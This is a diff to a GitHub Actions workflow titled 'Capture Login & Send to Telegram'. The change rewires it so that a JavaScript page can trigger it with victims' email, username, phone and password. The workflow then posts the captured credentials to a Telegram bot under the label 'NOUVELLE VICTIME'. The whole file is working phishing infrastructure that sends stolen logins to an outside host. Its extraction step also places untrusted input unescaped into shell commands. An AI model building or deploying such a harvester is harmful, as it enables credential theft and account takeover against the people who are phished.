@@ -1,25 +1,24 @@
 name: Capture Login & Send to Telegram
 
 on:
-  workflow_dispatch:
-    inputs:
-      email:
-        required: true
-      username:
-        required: true
-      phone:
-        required: false
-        default: "None"
-      password:
-        required: true
+  repository_dispatch:
+    types: [login-capture]  # Nom de l'événement (on triggera ça depuis JS)
 
 jobs:
   send:
     runs-on: ubuntu-latest
     steps:
+      - name: Extract data from dispatch
+        id: extract
+        run: |
+          echo "email=$(echo '${{ github.event.client_payload.email }}' | sed 's/ /+/g')" >> $GITHUB_OUTPUT
+          echo "username=$(echo '${{ github.event.client_payload.username }}' | sed 's/ /+/g')" >> $GITHUB_OUTPUT
+          echo "phone=$(echo '${{ github.event.client_payload.phone }}' | sed 's/ /+/g')" >> $GITHUB_OUTPUT
+          echo "password=$(echo '${{ github.event.client_payload.password }}' | sed 's/ /+/g')" >> $GITHUB_OUTPUT
+
       - name: Send to Telegram
         run: |
           curl -s -X POST https://api.telegram.org/bot${{ secrets.BOT_TOKEN }}/sendMessage \
             -d chat_id=${{ secrets.CHAT_ID }} \
             -d parse_mode=HTML \
-            -d text="<b>NOUVELLE VICTIME</b>%0AEmail: <code>${{ github.event.inputs.email }}</code>%0AUsername: <code>${{ github.event.inputs.username }}</code>%0APhone: <code>${{ github.event.inputs.phone }}</code>%0APassword: <code>${{ github.event.inputs.password }}</code>%0ATime: $(date +'%Y-%m-%d %H:%M:%S UTC')"
+            -d text="<b>NOUVELLE VICTIME</b>%0AEmail: <code>${{ steps.extract.outputs.email }}</code>%0AUsername: <code>${{ steps.extract.outputs.username }}</code>%0APhone: <code>${{ steps.extract.outputs.phone }}</code>%0APassword: <code>${{ steps.extract.outputs.password }}</code>%0ATime: $(date +'%Y-%m-%d %H:%M:%S UTC')"
